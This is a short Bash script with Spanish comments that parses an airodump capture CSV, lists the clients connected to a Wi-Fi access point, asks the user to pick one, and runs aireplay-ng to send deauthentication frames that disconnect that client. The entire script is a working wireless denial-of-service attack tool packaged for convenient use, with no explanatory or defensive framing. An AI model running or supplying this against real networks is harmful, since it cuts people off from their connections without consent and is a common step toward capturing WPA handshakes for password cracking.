#!/bin/bash

if [ $(id -u) -ne 0 ]; then
   echo "Este script debe ser ejecutado con privilegios de superusuario (sudo)" 
   exit 1
fi

archivo="captura-01.csv"

# Obtener direccion mac del Router del archivo csv
macap=$(grep -v '^BSSID' $archivo | awk -F',' -v op=2 'NR == op {print $1}')

# leer el archivo CSV y mostrar los clientes conectados al router en una lista numerada
echo "Clientes conectados al router $macap:"
grep -v '^BSSID\|Station' $archivo | awk -F',' '{print NR-3 ". " $1}' | tail -n +4

# solicitar al usuario que ingrese el número del cliente a deautenticar
echo "Ingrese el número del cliente al que desea realizar deauth:"
read opcion

opcion=$(expr $opcion + 4)

mac=$(grep -v '^BSSID' $archivo | awk -F',' -v op=$opcion 'NR == op {print $1}')

echo "Deauth a $mac del AP $macap"

aireplay-ng -0 2 -a $macap -c $mac wlp5s0mon